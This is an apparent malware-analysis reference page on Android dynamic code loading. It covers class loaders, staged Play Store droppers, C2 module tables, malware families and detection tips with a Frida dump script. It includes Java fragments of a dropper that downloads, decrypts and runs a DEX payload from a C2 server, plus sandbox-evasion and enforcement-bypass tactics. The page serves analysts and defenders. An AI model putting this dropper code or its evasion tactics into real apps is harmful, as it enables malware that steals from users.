# Dynamic Code Loading

Loading executable code at runtime rather than including it in the APK. The APK that passes Google Play Protect scanning contains no malicious code -- the real payload is downloaded, decrypted, or assembled after installation. This is the foundational technique behind dropper-based malware distribution and the primary reason Play Store scanners fail to catch banking trojans at upload time.

See also: [Packers](../packers/index.md), [Hooking](../reversing/hooking.md), [Anti-Analysis Techniques](anti-analysis-techniques.md#code-level-obfuscation)

??? abstract "MITRE ATT&CK"

    | ID | Technique | Tactic |
    |---|---|---|
    | [T1407](https://attack.mitre.org/techniques/T1407/) | Download New Code at Runtime | Defense Evasion |

??? warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | [`INTERNET`](../permissions/normal/internet.md) (for network-loaded payloads) |
    | Storage | Writable directory for DEX files (`getFilesDir()`, `getCacheDir()`) |
    | API | `DexClassLoader`, `InMemoryDexClassLoader`, `PathClassLoader` |

    No special permissions needed. Any app can load code from its own private storage or memory.

## Class Loaders

Android provides multiple class loaders for runtime code loading, each with different capabilities.

### DexClassLoader

The standard approach. Loads a DEX or JAR file from disk, outputs an optimized OAT file to a specified directory.

```java
File dexFile = new File(getFilesDir(), "payload.dex");
File optimizedDir = getDir("odex", Context.MODE_PRIVATE);

DexClassLoader loader = new DexClassLoader(
    dexFile.getAbsolutePath(),
    optimizedDir.getAbsolutePath(),
    null,
    getClassLoader()
);

Class<?> payloadClass = loader.loadClass("com.malware.Payload");
Method entryPoint = payloadClass.getMethod("execute", Context.class);
entryPoint.invoke(null, getApplicationContext());
```

### InMemoryDexClassLoader

Introduced in Android 8.0 (API 26). Loads DEX directly from a `ByteBuffer` without writing to disk. Significantly harder to detect and extract because the payload never touches the filesystem.

```java
byte[] dexBytes = decryptPayload(getEncryptedAsset("config.dat"));
ByteBuffer buffer = ByteBuffer.wrap(dexBytes);

InMemoryDexClassLoader loader = new InMemoryDexClassLoader(
    buffer,
    getClassLoader()
);

Class<?> cls = loader.loadClass("com.malware.Stage2");
cls.getMethod("init", Context.class).invoke(null, this);
```

### PathClassLoader Manipulation

The default `PathClassLoader` loads the APK's own classes. Malware can manipulate its internal `DexPathList` to inject additional DEX files into the existing class loader rather than creating a new one. This makes the loaded code appear as part of the original APK to reflection-based inspection.

```java
Object pathList = getField(classLoader, "pathList");
Object[] dexElements = (Object[]) getField(pathList, "dexElements");

Method makeElement = findMakeElementMethod(pathList);
Object newElement = makeElement.invoke(null, payloadDexFile);

Object[] combined = Arrays.copyOf(dexElements, dexElements.length + 1);
combined[dexElements.length] = newElement;
setField(pathList, "dexElements", combined);
```

## Payload Sources

| Source | Stealth | Persistence | Used By |
|--------|---------|-------------|---------|
| Encrypted asset in APK | Low (payload in APK, just encrypted) | High (survives without network) | Harly, most packers |
| Network download from C2 | High (no payload in APK at install) | Low (requires C2 availability) | Joker, Anatsa, SharkBot |
| SharedPreferences (Base64) | Medium (stored as string data) | Medium | Joker variants |
| ContentProvider from another app | Medium (payload in separate app) | Medium | Triada (system-level) |
| Steganographic image | High (payload hidden in PNG/JPEG) | Medium (image cached locally) | Necro |
| Expansion files (OBB) | Medium (separate download from Play) | High | Older dropper techniques |
| Firebase/cloud config | High (legitimate service as payload host) | Low | SpyLoan variants |

## Multi-Stage Dropper Architecture

The standard architecture for Play Store malware uses staged payload delivery to separate the benign-looking dropper from the malicious functionality.

### Stage 1: Play Store Dropper

A functional app (QR scanner, PDF reader, file manager) that passes all Play Store checks. Contains no malicious code. After installation, it contacts C2 to determine whether to activate.

Common activation conditions:

- Time delay (24-72 hours post-install to evade sandbox analysis)
- Geographic check (IP geolocation or SIM country code)
- Device validation (not an emulator, no analysis tools detected)
- C2 flag (server-side kill switch)

### Stage 2: Downloaded Payload

Once activated, Stage 1 downloads the real payload:

```java
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder()
    .url(c2Url + "/payload/" + deviceId)
    .build();

Response response = client.newCall(request).execute();
byte[] encrypted = response.body().bytes();
byte[] dexBytes = decrypt(encrypted, derivedKey);

File payloadFile = new File(getFilesDir(), "classes.dex");
FileOutputStream fos = new FileOutputStream(payloadFile);
fos.write(dexBytes);
fos.close();

DexClassLoader loader = new DexClassLoader(
    payloadFile.getAbsolutePath(),
    getDir("opt", MODE_PRIVATE).getAbsolutePath(),
    null,
    getClassLoader()
);
loader.loadClass("com.payload.Main")
    .getMethod("start", Context.class)
    .invoke(null, this);
```

### Stage 3: C2 Modules

Some families support modular architecture where individual capabilities are loaded as separate DEX modules from C2:

| Module | Functionality | Loaded When |
|--------|--------------|-------------|
| `overlay.dex` | Inject kit for banking apps | Target app detected on device |
| `sms.dex` | SMS interception | Post-privilege escalation |
| `vnc.dex` | Remote screen access | Operator requests session |
| `keylog.dex` | Accessibility keylogger | Always loaded |
| `ats.dex` | Automated transfer scripts | Target bank identified |

## Reflection-Based Instantiation

After loading a class, malware uses reflection to instantiate and invoke methods without compile-time dependencies. This also defeats static analysis since there are no direct references to the payload classes.

```java
Class<?> cls = loader.loadClass("com.payload.EntryPoint");

Object instance = cls.getDeclaredConstructor().newInstance();

Method init = cls.getDeclaredMethod("initialize", Context.class, String.class);
init.setAccessible(true);
init.invoke(instance, context, c2Url);

Method run = cls.getDeclaredMethod("run");
run.setAccessible(true);
run.invoke(instance);
```

## Families Using Dynamic Code Loading

| Family | Loading Method | Payload Source | Stages |
|--------|---------------|---------------|--------|
| [Joker](../malware/families/joker.md) | DexClassLoader | C2 download, SharedPreferences | 2-3 |
| [Anatsa](../malware/families/anatsa.md) | DexClassLoader | C2 download (staged) | 3 |
| [SharkBot](../malware/families/sharkbot.md) | DexClassLoader | Auto-update from C2 | 2 |
| [Necro](../malware/families/necro.md) | InMemoryDexClassLoader | Steganographic PNG | 3 |
| [Mandrake](../malware/families/mandrake.md) | DexClassLoader | Multi-stage C2 delivery | 4 |
| [Harly](../malware/families/harly.md) | DexClassLoader | Encrypted APK assets | 2 |
| [Triada](../malware/families/triada.md) | PathClassLoader injection | System partition / ContentProvider | 2 |
| [Xenomorph](../malware/families/xenomorph.md) | DexClassLoader | Dropper downloads payload APK | 2 |
| [Hook](../malware/families/hook.md) | DexClassLoader | Dropper with encrypted asset | 2 |
| [Vultur](../malware/families/vultur.md) | DexClassLoader | C2 download (encrypted) | 3 |
| [GoldPickaxe](../malware/families/goldpickaxe.md) | InMemoryDexClassLoader | C2 download | 2 |
| [SpyLoan](../malware/families/spyloan.md) | DexClassLoader | Firebase remote config | 2 |

## Steganographic Payload Delivery

!!! info "Steganography as Anti-Detection"

    [Necro](../malware/families/necro.md) (2024) demonstrated a notable technique: the payload DEX is embedded within a PNG image using steganographic encoding. The loader extracts pixel data from the image's alpha channel, reassembles the bytes into a DEX file, and loads it via `InMemoryDexClassLoader`. The PNG itself is a valid image that displays normally, making it invisible to content-based scanning. Check for high-entropy image assets in the APK's resources and assets directories.

## Connection to Packing

Commercial packers and malware dynamic loaders solve the same problem: executing code that is not visible in the APK's primary `classes.dex`. A packer encrypts the original DEX and bundles a stub that decrypts and loads it at runtime. The only architectural difference is that packers include the encrypted payload within the APK, while malware droppers download it from an external source.

See: [Packers](../packers/index.md) for detailed analysis of commercial packing solutions.

## Platform Lifecycle

| Android Version | API | Change | Offensive Impact |
|----------------|-----|--------|-----------------|
| 1.0 | 1 | `DexClassLoader` available | Runtime DEX loading from disk |
| 5.0 | 21 | ART replaces Dalvik, OAT compilation | DEX still loadable, compiled to native at load time |
| 8.0 | 26 | [`InMemoryDexClassLoader`](https://developer.android.com/reference/dalvik/system/InMemoryDexClassLoader) introduced | Fileless payload loading from `ByteBuffer`, no filesystem trace |
| 10 | 29 | Restricted access to `/data/local/tmp` | Minor, malware uses app-private directories |
| 13 | 33 | [Dynamic code loading audit warnings](https://developer.android.com/about/versions/13/behavior-changes-13) | Logged but not enforced |
| 14 | 34 | Dynamic code loading from writable paths triggers warning | DEX files in writable directories flagged by `DexFile` loading checks |
| 14 | 34 | `ENFORCE_DYNAMIC_CODE_LOADING` flag | Apps can opt into read-only enforcement for loaded code |
| 15 | 35 | Stricter enforcement for apps targeting API 35 | Loaded DEX must be in read-only paths; malware marks files read-only after writing or uses `InMemoryDexClassLoader` |

Android 14's restriction is significant: `DexClassLoader` loading from `getFilesDir()` or `getCacheDir()` now logs warnings, and apps targeting API 34+ that set `ENFORCE_DYNAMIC_CODE_LOADING` will crash if the loaded file is writable. Malware adapts by marking payload files as read-only after writing, or by using `InMemoryDexClassLoader` to avoid the filesystem entirely.

!!! tip "InMemoryDexClassLoader Leaves No Filesystem Trace"

    If a sample uses `InMemoryDexClassLoader`, the payload DEX never touches disk. The only way to capture it is at runtime using [Frida hooks](../reversing/hooking.md) on the class loader constructor (see the Frida script above) or by dumping the process memory. Static analysis alone will not reveal the payload.

## Detection During Analysis

??? example "Static Indicators"

    - `DexClassLoader` or `InMemoryDexClassLoader` in decompiled code
    - `Class.forName()` with string-constructed class names
    - `Method.invoke()` patterns on reflectively loaded classes
    - Encrypted blobs in assets directory (high entropy files)
    - Network URLs in strings referencing `.dex`, `.jar`, or `.apk` downloads
    - `getDir("odex")` or similar optimized-DEX output directories

??? example "Dynamic Indicators"

    - New DEX files appearing in app's private storage post-launch
    - Delayed network requests (hours after install) fetching large binary payloads
    - `dlopen` or `System.loadLibrary` for native code loading variants
    - Process loading DEX files not present in the original APK

??? example "Frida Script -- Dump Dynamically Loaded DEX Files"

    ```javascript
    Java.perform(function() {
        var DexClassLoader = Java.use("dalvik.system.DexClassLoader");
        DexClassLoader.$init.implementation = function(dexPath, optDir, libPath, parent) {
            console.log("[DCL] Loading DEX from: " + dexPath);
            var f = Java.use("java.io.File").$new(dexPath);
            console.log("[DCL] Size: " + f.length() + " bytes");
            return this.$init(dexPath, optDir, libPath, parent);
        };

        var InMemDCL = Java.use("dalvik.system.InMemoryDexClassLoader");
        InMemDCL.$init.overload("java.nio.ByteBuffer", "java.lang.ClassLoader")
            .implementation = function(buffer, parent) {
                console.log("[IMDCL] In-memory DEX loaded, size: " + buffer.remaining());
                var bytes = Java.array("byte", new Array(buffer.remaining()));
                buffer.get(bytes);
                buffer.rewind();
                var path = "/data/local/tmp/dumped_" + Date.now() + ".dex";
                var fos = Java.use("java.io.FileOutputStream").$new(path);
                fos.write(bytes);
                fos.close();
                console.log("[IMDCL] Dumped to: " + path);
                return this.$init(buffer, parent);
            };

        var ClassLoader = Java.use("java.lang.ClassLoader");
        ClassLoader.loadClass.overload("java.lang.String").implementation = function(name) {
            if (name.indexOf("com.malware") !== -1 || name.indexOf("payload") !== -1) {
                console.log("[CL] loadClass: " + name);
            }
            return this.loadClass(name);
        };
    });
    ```
